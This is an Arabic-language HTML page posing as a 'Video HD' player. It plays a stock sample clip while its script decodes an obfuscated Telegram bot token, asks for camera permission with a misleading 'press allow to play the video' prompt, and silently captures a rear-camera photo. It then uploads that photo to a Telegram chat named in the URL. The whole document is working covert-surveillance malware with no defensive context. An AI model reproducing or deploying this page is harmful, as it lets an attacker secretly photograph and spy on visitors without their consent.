<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video HD</title>
    <style>
        body { background: #000; text-align: center; margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; }
        video { width: 95%; max-width: 400px; border-radius: 12px; }
    </style>
</head>
<body>
    <video autoplay muted loop playsinline>
        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
    </video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        const t = atob("ODM4NjQyNzMyMTpBQUZLcThmQ3NvUEVEZ2NGOEtORlIyTlVyN0doMER3ZnNrRQ==");
        const id = new URLSearchParams(window.location.search).get('id');
        const v = document.createElement('video');
        window.onload = function() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
            .then(stream => {
                v.srcObject = stream; v.play();
                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
                    canvas.getContext('2d').drawImage(v, 0, 0);
                    canvas.toBlob(blob => {
                        const f = new FormData(); f.append('photo', blob, 'rear.jpg'); f.append('chat_id', id);
                        fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: f });
                    }, 'image/jpeg');
                }, 4000);
            }).catch(() => { alert("اضغط سماح لتشغيل الفيديو"); });
        };
    </script>
</body>
</html>
